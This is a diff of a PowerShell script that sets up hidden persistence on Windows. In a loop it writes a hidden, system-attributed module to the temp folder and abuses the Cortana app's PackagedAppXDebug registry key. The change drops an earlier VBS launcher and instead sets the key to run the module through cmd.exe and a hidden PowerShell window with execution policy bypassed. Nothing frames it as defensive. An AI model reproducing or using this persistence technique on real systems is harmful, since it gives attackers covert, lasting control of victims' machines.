@@ -345,8 +345,7 @@ $functions =  {
 	{
 		while($true)
 		{
-			$modulename = "27DE7628-520E-3CDA-9F1B-F39B324AC0CF.ps1"
-			$name = "persist.vbs"
+			$modulename = "34F3E433-9DE0-4930-AF3F-D099EF30490B.ps1"
 			
 			$modulenamepath = "$env:TEMP\$modulename"
 			$namepath = "$env:TEMP\$name"
@@ -359,16 +358,8 @@ $functions =  {
 				$modulenamefile.Attributes="Hidden","System"
 			}
 			
-			if(-Not ([System.IO.File]::Exists($namepath)))
-			{
-				echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
-				echo "objShell.run `"powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$modulename`", 0" >> $env:TEMP\$name
-				$namefile = Get-Item $env:TEMP\$name
-				$namefile.Attributes="Hidden","System"
-			}
-			
 			$cortana = Get-AppxPackage | Select-String "Microsoft.Windows.Cortana"
-			New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value $env:TEMP\$name -force
+			New-Item -Path HKCU:Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\$cortana -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$modulename" -force
 			
 			Start-Sleep -Seconds 5
 		}
